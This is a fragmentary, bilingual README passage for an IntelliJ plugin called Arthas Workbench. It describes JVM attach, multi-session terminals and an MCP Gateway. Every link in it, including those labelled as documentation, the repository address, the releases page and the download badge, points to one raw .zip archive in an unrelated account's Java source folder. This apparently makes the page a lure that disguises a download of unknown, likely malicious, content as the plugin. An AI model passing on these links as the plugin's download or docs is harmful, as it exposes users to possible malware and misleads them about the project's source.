...
[![Downloads](https://img.shields.io/jetbrains/plugin/d/com.github.wl2027.arthasworkbench.svg)](https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip)
...
Detailed operation documents: [https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip](https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip)

## 中文:

Arthas Workbench 是一个面向本地 Arthas 工作流的 IntelliJ IDEA 插件。它可以帮助你发现 IDEA Run/Debug 和本机上的 JVM 进程，用一致的流程完成 Arthas Attach，在独立工具窗口里管理多会话的 Terminal / Log，并提供稳定的 MCP Gateway 入口，方便 AI 工具或 IDE 助手接入。
...
详细操作文档: [https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip](https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip)
...
- 仓库地址：[wl2027/arthas-workbench](https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip)
- 当前版本：`0.0.3`
- 项目状态：`Alpha / 可用但持续演进`
...
- 把 Terminal、Log、Web UI 和 MCP Gateway 都放进同一个工作流。
...
- 同时维护多个 Arthas 会话，并快速查看 Terminal 与 Log。
...
从 [Releases](https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip) 下载最新插件包后，在 IDEA 中执行：
...
- 基于 `JediTerm + Telnet` 的 Arthas Terminal 交互体验
...
[template]: https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip
[docs:plugin-description]: https://raw.githubusercontent.com/fgfernandez93/arthas-workbench/main/src/main/java/com/alibaba/arthas/idea/workbench/service/arthas-workbench-v3.5.zip
